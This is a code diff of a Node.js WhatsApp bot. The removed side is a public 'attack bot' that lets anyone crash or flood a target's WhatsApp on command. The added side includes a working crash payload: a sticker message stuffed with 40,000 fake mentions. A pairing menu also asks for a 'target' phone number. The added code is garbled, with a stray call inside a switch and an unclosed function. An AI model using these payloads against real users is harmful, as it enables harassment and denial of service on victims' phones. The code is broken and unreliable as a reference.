@@ -1,326 +1,349 @@
-// ==============================================
-// DARK-GPT PUBLIC ATTACK BOT
-// SEMUA ORANG BISA PAKE, GA PAKE WHITELIST
-// ==============================================
-
 const {
     default: makeWASocket,
     useMultiFileAuthState,
-    fetchLatestBaileysVersion,
-    generateWAMessageFromContent
-} = require("@whiskeysockets/baileys");
-const qrcode = require("qrcode-terminal");
-const Pino = require("pino");
-const fs = require("fs");
+    fetchLatestBaileysVersion
+} = require("@whiskeysockets/baileys")
+const qrcode = require("qrcode-terminal")
+const Pino = require("pino")
+const readline = require("readline")
+const fs = require("fs")
 
-// ========== GLOBAL ==========
-let isConnected = false;
-global.sock = null;
+// ───────── GLOBAL STATE ─────────
+let startTime = Date.now()
+let msgCount = 0
+let errCount = 0
+let lastLog = "-"
+let lastCPU = 0
+let reconnecting = false
+global.sock = null
 
-// ========== FUNGSI ATTACK ==========
-// [PASTIKAN SEMUA FUNGSI INI ADA: bulldozer, VampireBlank, protocolbug3, protocolbug5]
-// Copy semua fungsi attack lu ke sini...
+// Pairing number — akan terisi lewat menu
+global.pairingNumber = null
 
-// ========== PUBLIC COMMAND HANDLER ==========
-class PublicAttackBot {
-    constructor(sock) {
-        this.sock = sock;
-        this.cooldown = new Map(); // Anti spam
-        this.attackCount = new Map(); // Hitung attack per user
-    }
+// STATUS PANEL
+global.currentStatus = "Menunggu..."
+global.currentDevice = "-"
 
-    async handlePublicCommand(sender, text) {
-        // Anti cooldown (5 detik)
-        const now = Date.now();
-        if (this.cooldown.has(sender)) {
-            const lastTime = this.cooldown.get(sender);
-            if (now - lastTime < 5000) {
-                await this.sock.sendMessage(sender, { 
-                    text: "⏳ Tunggu 5 detik lagi kontol, jangan spam!" 
-                });
-                return;
-            }
-        }
-        this.cooldown.set(sender, now);
+// CPU LIGHT
+let lastCPUTime = process.cpuUsage()
+setInterval(() => {
+    const now = process.cpuUsage()
+    lastCPU = (
+        now.user - lastCPUTime.user +
+        now.system - lastCPUTime.system
+    ) / 1000
+    lastCPU = lastCPU.toFixed(1)
+    lastCPUTime = now
+}, 1000)
 
-        // Parse command
-        const parts = text.toLowerCase().split(' ');
-        const command = parts[0];
-        const targetNumber = parts[1];
-
-        if (!targetNumber || !/^62\d{9,}$/.test(targetNumber.replace(/[^0-9]/g, ''))) {
-            await this.sock.sendMessage(sender, { 
-                text: "❌ Format salah goblok!\n\nContoh yang bener:\n`bulldozer 6281234567890`\n`forceclose 6281234567890`\n\nKetik `menu` buat liat semua perintah." 
-            });
-            return;
-        }
-
-        const target = targetNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-        const senderInfo = sender.split('@')[0];
-
-        // Log
-        console.log(`🔫 [ATTACK] ${senderInfo} → ${command} → ${target}`);
-
-        // Konfirmasi ke user
-        await this.sock.sendMessage(sender, { 
-            text: `⚡ *ATTACK DITERIMA!*\n\n• Dari: ${senderInfo}\n• Command: ${command}\n• Target: ${target}\n\n⏳ *Sedang diproses...*` 
-        });
-
-        try {
-            // Eksekusi command
-            let result;
-            switch(command) {
-                case 'bulldozer':
-                    await bulldozer(target);
-                    result = "✅ Bulldozer Attack TERKIRIM!\nTarget akan kena spam sticker status!";
-                    break;
-                
-                case 'vampire':
-                    await VampireBlank(target, true);
-                    result = "✅ Vampire Blank TERKIRIM!\nTarget WhatsApp mungkin crash/force close!";
-                    break;
-                
-                case 'bug3':
-                    await protocolbug3(target, true);
-                    result = "✅ Protocol Bug 3 TERKIRIM!\nVideo bug + mention massal dikirim!";
-                    break;
-                
-                case 'bug5':
-                    await protocolbug5(target, true);
-                    result = "✅ Protocol Bug 5 TERKIRIM!\nNewsletter bug + exploit aktif!";
-                    break;
-                
-                case 'fullattack':
-                    await bulldozer(target);
-                    await new Promise(r => setTimeout(r, 1000));
-                    await VampireBlank(target, true);
-                    await new Promise(r => setTimeout(r, 1000));
-                    await protocolbug3(target, true);
-                    await new Promise(r => setTimeout(r, 1000));
-                    await protocolbug5(target, true);
-                    result = "☢️ *FULL ATTACK COMPLETE!*\nSemua serangan dikirim ke target!\nWhatsApp target kemungkinan besar FORCE CLOSE!";
-                    break;
-                
-                case 'forceclose':
-                    // Brutal mode
-                    for (let i = 1; i <= 3; i++) {
-                        await VampireBlank(target, true);
-                        await this.sock.sendMessage(sender, { 
-                            text: `💣 Wave ${i}/3: Vampire sent...` 
-                        });
-                        await new Promise(r => setTimeout(r, 800));
-                        
-                        await protocolbug3(target, true);
-                        await this.sock.sendMessage(sender, { 
-                            text: `💥 Wave ${i}/3: Protocol Bug 3 sent...` 
-                        });
-                        await new Promise(r => setTimeout(r, 800));
-                    }
-                    result = "💀 *FORCE CLOSE ATTACK COMPLETE!*\nTarget WhatsApp kemungkinan:\n• FORCE CLOSE\n• LAG PARAH\n• BUTUH REINSTALL\n• MEMORY OVERLOAD";
-                    break;
-                
-                default:
-                    await this.sock.sendMessage(sender, { 
-                        text: "❌ Command ga dikenal! Ketik `menu` buat liat list command." 
-                    });
-                    return;
-            }
-
-            // Hitung attack user
-            const count = (this.attackCount.get(sender) || 0) + 1;
-            this.attackCount.set(sender, count);
-
-            // Kirim hasil
-            await this.sock.sendMessage(sender, { 
-                text: `${result}\n\n📊 *STATS:*\n• Kamu udah attack: ${count}x\n• Target: ${target}\n• Waktu: ${new Date().toLocaleTimeString()}\n\n⚠️ *Gunakan dengan bijak!*` 
-            });
-
-            // Log sukses
-            console.log(`✅ [SUCCESS] ${senderInfo} attacked ${target} with ${command}`);
-
-        } catch (error) {
-            console.error(`❌ [ERROR] ${senderInfo}: ${error.message}`);
-            await this.sock.sendMessage(sender, { 
-                text: `❌ *GAGAL!* Error: ${error.message}\n\nMungkin:\n1. Target ga valid\n2. Session bot lagi masalah\n3. WhatsApp lagi limit` 
-            });
-        }
-    }
-
-    sendPublicMenu(sender) {
-        const menu = `
-🤖 *DARK-GPT PUBLIC ATTACK BOT* 🤖
-*SEMUA ORANG BISA PAKE!*
-
-🔥 *PERINTAH ATTACK:*
-• \`bulldozer 62xxx\` - Spam sticker status
-• \`vampire 62xxx\` - Crash via dokumen corrupt
-• \`bug3 62xxx\` - Bug video + mention 30k
-• \`bug5 62xxx\` - Bug newsletter exploit
-• \`fullattack 62xxx\` - SEMUA attack sekaligus
-• \`forceclose 62xxx\` - BRUTAL! Force close WA target
-
-📝 *CONTOH:*
-\`bulldozer 6281234567890\`
-\`forceclose 6281234567890\`
-
-⚡ *FITUR:*
-• Auto response
-• No whitelist (semua bisa pake)
-• Cooldown 5 detik
-• Attack counter
-• Error handling
-
-⚠️ *PERINGATAN:*
-• Gunakan untuk testing saja!
-• Risiko banned WhatsApp!
-• Jangan abuse!
-
-🔧 *BOT INFO:*
-Owner: Adz-Gantenk
-Dibuat: 8/1/2026
-Status: ${isConnected ? '🟢 ONLINE' : '🔴 OFFLINE'}
-
-_Ketik command langsung, contoh: bulldozer 628xxxx_
-        `;
-        this.sock.sendMessage(sender, { text: menu });
-    }
+// ───────── HELPERS ─────────
+function formatUptime(ms) {
+    let s = Math.floor(ms / 1000)
+    let m = Math.floor(s / 60)
+    let h = Math.floor(m / 60)
+    s %= 60
+    m %= 60
+    return `${h}h ${m}m ${s}s`
 }
+function getRam() {
+    return (process.memoryUsage().rss / 1024 / 1024).toFixed(1) + " MB"
+}
+function green(t) { return `\x1b[32m${t}\x1b[0m` }
+function red(t) { return `\x1b[31m${t}\x1b[0m` }
+function yellow(t) { return `\x1b[33m${t}\x1b[0m` }
 
-// ========== SIMPLE PANEL ==========
-function showSimplePanel() {
-    console.clear();
+// ───────── PANEL UI ─────────
+function panel(ping = "-", showSource = false) {
+    console.clear()
     console.log(`
-╔══════════════════════════════════════╗
-║    🚀 DARK-GPT PUBLIC ATTACK BOT    ║
-║    🔥 NO WHITELIST - ALL ACCESS     ║
-╚══════════════════════════════════════╝
-
-📡 Status: ${isConnected ? '🟢 CONNECTED' : '🔴 CONNECTING...'}
-👥 Mode: PUBLIC (Semua orang bisa attack)
-⚡ Commands aktif via WhatsApp
-⏱️  Started: ${new Date().toLocaleTimeString()}
-
-📝 CARA PAKAI:
-1. Scan QR dengan WhatsApp
-2. Kirim command ke bot:
-   • bulldozer 62xxx
-   • forceclose 62xxx
-3. Bot auto execute ke target!
-
-⚠️  PERINGATAN:
-• Bot ini PUBLIC, siapa saja bisa pakai!
-• Risiko tinggi terhadap target!
-• Gunakan dengan tanggung jawab!
-
-========================================
-`);
+┌─────────────────────────────────────────────┐
+│          ${green("WHATSAPP BOT PANEL ULTRA")}        │
+├─────────────────────────────────────────────┤
+│ Status : ${global.currentStatus}
+│ Device : ${global.currentDevice}
+│ Uptime : ${formatUptime(Date.now() - startTime)}
+│ CPU    : ${lastCPU} ms
+│ RAM    : ${getRam()}
+│ Ping   : ${ping}
+│ Msg In : ${msgCount}
+│ Errors : ${errCount}
+├─────────────────────────────────────────────┤
+│ Menu Interaktif:
+│ 1) Restart Bot
+│ 2) Refresh Panel
+│ 3) Tampilkan QR Lagi
+│ 4) Pairing Nomor HP
+│ 5) Keluar Bot
+│ 6) About / Source Code
+├─────────────────────────────────────────────┤
+│ Log Terakhir:
+│ ${yellow(lastLog)}
+${showSource ? `
+├─────────────────────────────────────────────┤
+│ ${green("Source & Credits")}
+│ Author       : Rangga
+│ Script Writer: ChatGPT
+│ Designer     : Rangga & ChatGPT
+│ Versi Bot    : Ultra Pairing Ready
+` : ""}
+└─────────────────────────────────────────────┘
+`)
 }
 
-// ========== MAIN BOT ==========
-async function startPublicBot() {
+// ───────── MENU INPUT ─────────
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+})
+
+function setupMenu(sock) {
+    rl.removeAllListeners("line")
+    rl.on("line", async (input) => {
+        switch (input.trim()) {
+          await bulldozer(target);
+            case "1":
+                console.log(red("\n→ Restarting bot...\n"))
+                restartBot()
+                break
+
+            case "2":
+                panel()
+                break
+
+            case "3":
+                if (global.lastQR) qrcode.generate(global.lastQR, { small: true })
+                else console.log(red("Tidak ada QR tersedia."))
+                break
+
+            case "4":
+                rl.question("Masukkan nomor HP target (contoh 6281234567890): ", async (num) => {
+                    if (!num) {
+                        console.log(red("Nomor tidak valid!"))
+                        return panel()
+                    }
+                    global.pairingNumber = num.replace(/[^0-9]/g,"")
+                    console.log(green(`→ Nomor pairing disimpan: ${global.pairingNumber}`))
+                    global.currentStatus = `Pairing siap: ${global.pairingNumber}`
+                    panel()
+                })
+                break
+
+            case "5":
+                console.log(red("→ Keluar bot"))
+                process.exit(0)
+                break
+
+            case "6":
+                panel("-", true)
+                break
+
+            default:
+                console.log(yellow("Perintah tidak dikenal."))
+        }
+    })
+}
+
+// ───────── AUTH SAFETY ─────────
+function checkAuthIntegrity() {
     try {
-        const { state, saveCreds } = await useMultiFileAuthState("./auth_public");
-        const { version } = await fetchLatestBaileysVersion();
+        if (!fs.existsSync("./auth")) return true
+        let files = fs.readdirSync("./auth")
+        if (files.length < 2) return true
+        if (!fs.existsSync("./auth/creds.json")) return true
+        try { JSON.parse(fs.readFileSync("./auth/creds.json", "utf8")) }
+        catch { return true }
+        return false
+    } catch {
+        return true
+    }
+}
+
+function restartBot() {
+    startTime = Date.now()
+    msgCount = 0
+    errCount = 0
+    lastLog = "-"
+    reconnecting = false
+    global.currentStatus = "Menunggu..."
+    global.currentDevice = "-"
+    panel()
+    delete require.cache[require.resolve("./index.js")]
+    process.removeAllListeners("uncaughtException")
+    process.removeAllListeners("unhandledRejection")
+    startBot()
+}
+
+// ───────── START BOT ─────────
+async function bulldozer(target) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
+  };
+
+async function startBot() {
+    try {
+        if (checkAuthIntegrity()) {
+            try { fs.rmSync("./auth", { recursive: true, force: true }) } catch {}
+            global.currentStatus = "Auth corrupt → Delete & scan ulang"
+            panel()
+        }
+
+        if (global.sock) {
+            try { global.sock.end?.() } catch {}
+            try { global.sock.ws?.close?.() } catch {}
+        }
+
+        const { state, saveCreds } = await useMultiFileAuthState("./auth")
+        const { version } = await fetchLatestBaileysVersion()
 
         const sock = makeWASocket({
             version,
             auth: state,
-            logger: Pino({ level: "silent" }),
-            printQRInTerminal: true
-        });
+            logger: Pino({ level: "silent" })
+        })
+        global.sock = sock
+        setupMenu(sock)
 
-        global.sock = sock;
-        const bot = new PublicAttackBot(sock);
+        global.currentStatus = "Menunggu QR..."
+        global.currentDevice = "-"
+        panel()
 
-        sock.ev.on('connection.update', (update) => {
-            const { connection, qr } = update;
-            
+        sock.ev.on("connection.update", async (update) => {
+            const { qr, connection, lastDisconnect } = update
+
+            // Saat ada event QR + mulai konek
+            if ((!!qr || connection === "connecting") && global.pairingNumber) {
+                try {
+                    const pairingCode = await sock.requestPairingCode(global.pairingNumber)
+                    console.log(green(`\n→ Pairing code untuk ${global.pairingNumber}:`), pairingCode)
+                    console.log(yellow("→ Silakan scan di HP target dalam 60 detik.\n"))
+                } catch (e) {
+                    console.log(red("→ Gagal generate pairing code:"), e.message)
+                }
+            }
+
+            // Normal QR output
             if (qr) {
-                console.log("\n📱 Scan QR ini dengan WhatsApp:");
-                qrcode.generate(qr, { small: true });
+                global.lastQR = qr
+                global.currentStatus = "Scan QR!"
+                global.currentDevice = "-"
+                panel()
+                qrcode.generate(qr, { small: true })
             }
-            
-            if (connection === 'open') {
-                isConnected = true;
-                const dev = sock.user?.id?.split(':')[0] || 'Unknown';
-                console.log(`\n✅ BOT CONNECTED! Device: ${dev}`);
-                console.log(`🔥 BOT READY! Kirim command via WhatsApp`);
-                console.log(`🌐 MODE: PUBLIC - Semua orang bisa attack!\n`);
-                
-                // Broadcast ke beberapa chat bahwa bot online
-                const broadcastMsg = `🤖 *DARK-GPT PUBLIC BOT ONLINE!*\n\nBot attack WhatsApp sekarang LIVE!\nKetik \`menu\` untuk bantuan.\n\n*PERINGATAN:* Bot ini PUBLIC, hati-hati penyalahgunaan!`;
-                
-                // Auto join beberapa group (optional)
-                // sock.sendMessage("628xxxxxxxxxx@g.us", { text: broadcastMsg });
+
+            // OPEN
+            if (connection === "open") {
+                let dev = sock.user.id.split(":")[0]
+                if (dev === "s.whatsapp.net") {
+                    console.log(red("→ DETEKSI SESSION RUSAK → Reset"))
+                    try { fs.rmSync("./auth", { recursive: true, force: true }) } catch {}
+                    return restartBot()
+                }
+                global.currentStatus = green("Terhubung ✓")
+                global.currentDevice = dev
+                panel()
             }
-            
-            if (connection === 'close') {
-                isConnected = false;
-                console.log("\n❌ Connection lost, reconnecting...");
-                setTimeout(startPublicBot, 3000);
+
+            // CLOSE / RECONNECT
+            if (connection === "close") {
+                const code = lastDisconnect?.error?.output?.statusCode
+                global.currentStatus = red("Terputus, reconnect...")
+                global.currentDevice = "-"
+                panel()
+                if (code === 401) {
+                    try { fs.rmSync("./auth", { recursive: true, force: true }) } catch {}
+                    return restartBot()
+                }
+                if (!reconnecting) {
+                    reconnecting = true
+                    setTimeout(startBot, 2500)
+                }
             }
-        });
+        })
 
-        sock.ev.on('creds.update', saveCreds);
+        sock.ev.on("creds.update", saveCreds)
 
-        // ========== HANDLE SEMUA PESAN ==========
-        sock.ev.on('messages.upsert', async ({ messages }) => {
-            try {
-                const msg = messages[0];
-                if (!msg.message) return;
+        sock.ev.on("messages.upsert", async ({ messages }) => {
+            let msg = messages[0]
+            if (!msg.message) return
+            if (!msg.key.fromMe) msgCount++
 
-                const sender = msg.key.remoteJid;
-                const text = msg.message.conversation || 
-                            msg.message.extendedTextMessage?.text || '';
+            let from = msg.key.remoteJid
+            let text =
+                msg.message.conversation ||
+                msg.message.extendedTextMessage?.text ||
+                ""
 
-                // Show incoming message
-                console.log(`📩 [${new Date().toLocaleTimeString()}] ${sender.split('@')[0]}: ${text.substring(0, 30)}...`);
+            lastLog = `${from} → ${text}`
+            panel()
 
-                // Handle commands
-                const cmd = text.toLowerCase().split(' ')[0];
-                if (['bulldozer', 'vampire', 'bug3', 'bug5', 'fullattack', 'forceclose'].includes(cmd)) {
-                    await bot.handlePublicCommand(sender, text);
-                }
-                else if (['menu', 'help', 'bot', 'start'].includes(cmd)) {
-                    await bot.sendPublicMenu(sender);
-                }
-                else if (cmd === 'ping') {
-                    await sock.sendMessage(sender, { text: '🏓 Pong! Bot aktif!' });
-                }
-                else if (text && !text.startsWith('!') && text.length > 3) {
-                    // Auto reply untuk pesan random
-                    await sock.sendMessage(sender, { 
-                        text: `🤖 Ini *DARK-GPT ATTACK BOT*\n\nKetik \`menu\` untuk bantuan.\nContoh command: \`bulldozer 6281234567890\`\n\nBot ini PUBLIC, semua orang bisa pakai!` 
-                    });
-                }
-
-            } catch (error) {
-                console.error("Message handling error:", error);
+            if (text === "ping") {
+                let t = Date.now()
+                await sock.sendMessage(from, { text: "pong!" })
+                let ping = Date.now() - t
+                panel(ping + " ms")
             }
-        });
+        })
 
-        // Auto update panel setiap 10 detik
-        setInterval(showSimplePanel, 10000);
-        showSimplePanel();
+        process.on("uncaughtException", (err) => {
+            errCount++
+            lastLog = red("Error: " + err.message)
+            panel()
+        })
+        process.on("unhandledRejection", (err) => {
+            errCount++
+            lastLog = red("Reject: " + err)
+            panel()
+        })
 
-    } catch (error) {
-        console.error("Bot startup error:", error);
-        setTimeout(startPublicBot, 5000);
+    } catch (e) {
+        console.log(red("Startup Error:"), e)
+        setTimeout(startBot, 2000)
     }
 }
 
-// ========== STARTUP ==========
-console.log(`
-██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ███████╗████████╗
-██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔════╝╚══██╔══╝
-██║  ██║███████║██████╔╝█████╔╝     ██████╔╝█████╗     ██║   
-██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██╔══╝     ██║   
-██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝███████╗   ██║   
-╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
-                                                            
-                PUBLIC ATTACK BOT v3.0
-                NO WHITELIST - ALL ACCESS
-                BY ADZ-GPT
-`);
-
-startPublicBot();
+startBot()
